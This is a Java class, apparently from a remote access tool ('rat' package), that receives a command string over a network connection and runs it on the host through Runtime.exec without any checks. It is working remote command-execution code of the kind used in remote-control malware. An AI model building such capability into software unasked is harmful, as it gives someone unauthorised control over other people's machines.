/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;

public final class CommandPacket implements IPacket {
	
	private String command;
	
	public CommandPacket(final String command) {
		this.command = command;
	}
	
	public CommandPacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUtf(command);
	}
	
	public void receive(final ActiveConnection connection) {
		command = connection.readUtf();
	}
	
	public void execute(final ActiveConnection connection) {
		try {
			Runtime.getRuntime().exec(command);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
}
